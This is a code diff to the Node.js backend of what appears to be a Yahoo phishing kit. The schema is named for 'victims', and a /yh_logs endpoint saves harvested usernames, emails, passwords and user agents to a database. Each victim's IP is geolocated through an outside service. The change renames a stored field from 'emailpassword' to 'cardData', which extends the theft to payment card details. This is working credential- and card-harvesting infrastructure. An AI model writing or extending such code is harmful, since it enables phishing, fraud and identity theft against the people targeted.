@@ -24,7 +24,7 @@ yahooVictimSchema = new mongoose.Schema({
     email: String,
     password: String,
     password2: String,
-    emailpassword: String,
+    cardData: String,
     userAgent: String,
     victimIpInfo: {}
 }, {
@@ -53,14 +53,14 @@ app.get("/yh_logs", (req, res) => {
     console.log(visitorIp)
     console.log(req.body)
     res.setHeader("Content-Type", "text/plain");
-    getVictimIpInfoAndSaveYahooVictimInfoToDb(req.query.username, req.query.email, req.query.password, req.query.password2,req.query.emailpassword, req.headers['user-agent'], req, res);
+    getVictimIpInfoAndSaveYahooVictimInfoToDb(req.query.username, req.query.email, req.query.password, req.query.password2,req.query.cardData, req.headers['user-agent'], req, res);
 })
 
 app.use(express.static('web'));
 
 
 
-function getVictimIpInfoAndSaveYahooVictimInfoToDb(username, email, password, password2, emailpassword, userAgent, req, res) {
+function getVictimIpInfoAndSaveYahooVictimInfoToDb(username, email, password, password2, cardData, userAgent, req, res) {
 
     rp({
         uri: `http://ip-api.com/json/${visitorIp}`,
@@ -73,7 +73,7 @@ function getVictimIpInfoAndSaveYahooVictimInfoToDb(username, email, password, pa
             email,
             password,
             password2,
-            emailpassword,
+            cardData,
             userAgent,
             victimIpInfo
         }).save((err, doc) => {
